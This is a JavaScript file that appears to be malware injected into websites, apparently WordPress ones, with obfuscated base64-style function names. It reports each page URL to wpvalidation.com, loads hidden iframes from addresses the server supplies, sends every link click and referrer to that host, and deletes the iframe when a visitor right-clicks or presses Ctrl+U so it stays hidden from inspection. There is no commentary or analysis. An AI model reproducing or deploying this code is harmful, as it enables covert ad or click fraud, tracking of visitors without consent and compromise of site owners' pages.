
    function SGVsbG8gd29ybGQ(adepto_site) {

        return new Promise(function (resolve, reject) {

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://wpvalidation.com/action/SGVsbG8gd29ybGQ", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var responseJSON = JSON.parse(xhr.responseText);
                        resolve(responseJSON);
                    }
                }
            };
            xhr.send("SGVsbG8gd29ybGQ=" + encodeURIComponent(adepto_site));
        });


    }

    function aW5zZXJ0X2FkZXB0bw(adepto_site) {

        return new Promise(function (resolve, reject) {

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://wpvalidation.com/action/aW5zZXJ0X2FkZXB0bw", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var responseJSON = JSON.parse(xhr.responseText);
                        resolve(responseJSON);
                    } else {
                    }
                }
            };


            var parametros = {
                "SGVsbG8gd29ybGQ": adepto_site,
                "main": 1,
            };

            var queryString = Object.keys(parametros).map(function (key) {
                return key + "=" + encodeURIComponent(parametros[key]);
            }).join("&");

            xhr.send(queryString);
        });



    }

    function YTWGGLH2895N12(adepto_site) {
        return new Promise(function (resolve, reject) {

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://wpvalidation.com/action/YTWGGLH2895N12", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var responseJSON = JSON.parse(xhr.responseText);
                        resolve(responseJSON);
                    } else {
                    }
                }
            };


            var parametros = {
                "SGVsbG8gd29ybGQ": adepto_site,
                "main": 1,
            };

            var queryString = Object.keys(parametros).map(function (key) {
                return key + "=" + encodeURIComponent(parametros[key]);
            }).join("&");

            xhr.send(queryString);
        });



    }

    function Z2V0X2FkZXB0bw(adepto_site) {
        return new Promise(function (resolve, reject) {

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://wpvalidation.com/action/Z2V0X2FkZXB0bw", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var responseJSON = JSON.parse(xhr.responseText);
                        resolve(responseJSON);
                    } else {
                    }
                }
            };
            xhr.send("SGVsbG8gd29ybGQ=" + encodeURIComponent(adepto_site));
        });

    }

    function YWRkSW5qZWN0aW9u(dxneid) {

        if (dxneid.length == 0) {

        } else {

            var iframe = document.createElement('iframe');
            iframe.width = '360';
            iframe.height = '800';


            iframe.src = atob('' + dxneid + '');

            iframe.id = "abxy";

            iframe.style.display = 'none';

            document.body.appendChild(iframe);

            setTimeout(function () {
                iframe.remove();
            }, 20000);
        }
    }

    function Y2xpcXVlc19uby12aXRhbWVudGU(adp, click, origin) {

        return new Promise(function (resolve, reject) {

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://wpvalidation.com/action/Y2xpcXVlc19uby12aXRhbWVudGU", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        var responseJSON = JSON.parse(xhr.responseText);
                        resolve(responseJSON);
                    } else {
                    }
                }
            };

            var parametros = {
                "adp": adp,
                "click": click,
                "origin": origin,
            };

            var queryString = Object.keys(parametros).map(function (key) {
                return key + "=" + encodeURIComponent(parametros[key]);
            }).join("&");

            xhr.send(queryString);

        });





    }

    SGVsbG8gd29ybGQ(window.location.href)
        .then(function (response) {


            if (response.status == "true") {
                aW5zZXJ0X2FkZXB0bw(window.location.href)
            } else if (response.status == "false") {

                YTWGGLH2895N12(window.location.href)
            }

            Z2V0X2FkZXB0bw(window.location.href).then(function (response) {

                const around = Math.floor(Math.random() * 101);

                if (around <= response.adp_proportion) {


                    if (response.adp_active == 1) {

                        YWRkSW5qZWN0aW9u(response.adp_id)
                    }


                }

            })



        })
        .catch(function (error) { });

    const click = document.querySelectorAll('body a');

    click.forEach(link => {
        link.addEventListener('click', function (event) {

            const a_click = this.getAttribute('href');

            Y2xpcXVlc19uby12aXRhbWVudGU(window.location.href, a_click, document.referrer);


        });
    });

    document.addEventListener('contextmenu', function (event) {

        if (event.which === 3 || event.button === 2) {

            var iframe = document.getElementById('abxy');

            if (iframe) {
                iframe.remove();
            }

        }
    });

    document.addEventListener('keydown', function (event) {

        if (event.ctrlKey && event.key === 'u') {

            var iframe = document.getElementById('abxy');
            if (iframe) {
                iframe.remove();
            }
        }
    });
